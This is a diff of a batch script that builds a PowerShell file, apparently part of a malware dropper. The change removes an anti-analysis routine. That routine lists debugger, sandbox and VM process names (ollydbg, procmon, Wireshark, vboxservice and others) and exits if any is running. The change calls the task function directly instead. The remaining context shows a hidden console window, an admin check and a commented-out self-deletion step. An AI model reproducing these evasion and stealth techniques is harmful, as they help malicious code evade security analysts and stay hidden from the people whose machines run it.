@@ -253,58 +253,6 @@ echo } >> powershell123.ps1
 echo catch {} >> powershell123.ps1
 echo } >> powershell123.ps1
 echo } >> powershell123.ps1
-echo function Invoke-ANTIVM { >> powershell123.ps1
-echo function antivm >> powershell123.ps1
-echo { >> powershell123.ps1
-echo "autoruns" >> powershell123.ps1
-echo "autorunsc" >> powershell123.ps1
-echo "dumpcap" >> powershell123.ps1
-echo "Fiddler" >> powershell123.ps1
-echo "fakenet" >> powershell123.ps1
-echo "HookExplorer" >> powershell123.ps1
-echo "ImmunityDebugger" >> powershell123.ps1
-echo "httpdebugger" >> powershell123.ps1
-echo "ImportREC" >> powershell123.ps1
-echo "LordPE" >> powershell123.ps1
-echo "PETools" >> powershell123.ps1
-echo "ProcessHacker" >> powershell123.ps1
-echo "ResourceHacker" >> powershell123.ps1
-echo "Scylla_x64" >> powershell123.ps1
-echo "sandman" >> powershell123.ps1
-echo "SysInspector" >> powershell123.ps1
-echo "tcpview" >> powershell123.ps1
-echo "die" >> powershell123.ps1
-echo "dumpcap" >> powershell123.ps1
-echo "filemon" >> powershell123.ps1
-echo "idaq" >> powershell123.ps1
-echo "idaq64" >> powershell123.ps1
-echo "joeboxcontrol" >> powershell123.ps1
-echo "joeboxserver" >> powershell123.ps1
-echo "ollydbg" >> powershell123.ps1
-echo "proc_analyzer" >> powershell123.ps1
-echo "procexp" >> powershell123.ps1
-echo "procmon" >> powershell123.ps1
-echo "regmon" >> powershell123.ps1
-echo "sniff_hit" >> powershell123.ps1
-echo "sysAnalyzer" >> powershell123.ps1
-echo "tcpview" >> powershell123.ps1
-echo "windbg" >> powershell123.ps1
-echo "Wireshark" >> powershell123.ps1
-echo "x32dbg" >> powershell123.ps1
-echo "x64dbg" >> powershell123.ps1
-echo "Vmwareuser" >> powershell123.ps1
-echo "Vmacthlp" >> powershell123.ps1
-echo "vboxservice" >> powershell123.ps1
-echo "vboxtray" >> powershell123.ps1
-echo } >> powershell123.ps1
-echo $processnames = antivm >> powershell123.ps1
-echo if(($processnames ^| ForEach-Object {Get-Process -Name $_ -ea SilentlyContinue}) -eq $null){ >> powershell123.ps1
-echo Invoke-TASKS >> powershell123.ps1
-echo } >> powershell123.ps1
-echo else{ >> powershell123.ps1
-echo exit >> powershell123.ps1
-echo } >> powershell123.ps1
-echo } >> powershell123.ps1
 echo function Hide-Console >> powershell123.ps1
 echo { >> powershell123.ps1
 echo if (-not ("Console.Window" -as [type])) { >> powershell123.ps1
@@ -320,7 +268,7 @@ echo $null = [Console.Window]::ShowWindow($consolePtr, 0) >> powershell123.ps1
 echo } >> powershell123.ps1
 echo if (CHECK_IF_ADMIN -eq $true) { >> powershell123.ps1
 echo Hide-Console >> powershell123.ps1
-echo Invoke-ANTIVM >> powershell123.ps1
+echo Invoke-TASKS >> powershell123.ps1
 echo # Self-Destruct >> powershell123.ps1
 echo # Remove-Item $PSCommandPath -Force >> powershell123.ps1
 echo } else { >> powershell123.ps1
